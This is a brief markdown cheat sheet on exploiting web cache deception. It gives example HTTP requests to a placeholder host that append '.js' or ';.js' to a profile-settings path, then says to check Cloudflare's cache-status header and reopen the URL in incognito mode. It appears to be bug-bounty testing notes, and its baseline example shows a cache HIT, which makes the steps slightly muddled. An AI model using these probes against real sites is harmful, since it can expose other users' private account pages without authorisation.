# Web Cache Deception

### How to exploit



* Normal Request (For example in the settings profile feature)

```
GET /profile/setting HTTP/1.1
Host: www.vuln.com
```

The response is

```
HTTP/2 200 OK 
Content-Type: text/html
Cf-Cache-Status: HIT 
...
```

1. Try to add cacheable extension (For example .js / .css / .jpg, etc.)

```
GET /profile/setting/.js HTTP/1.1
Host: www.vuln.com
```

The response is

```
HTTP/2 200 OK 
Content-Type: text/html
Cf-Cache-Status: HIT 
...
```

If the `Cf-Cache-Status` response the request with `HIT` not `MISS` or `Error`. And then try to open the url in incognito mode

1. Add `;` before the extension (For example `;.js` / `;.css` / `;.jpg`, etc.)

```
GET /profile/setting/;.js HTTP/1.1
Host: www.vuln.com
```

The response is

```
HTTP/2 200 OK 
Content-Type: text/html
Cf-Cache-Status: HIT 
...
```

If the `Cf-Cache-Status` response the request with `HIT` not `MISS` or `Error`. And then try to open the url in incognito mode
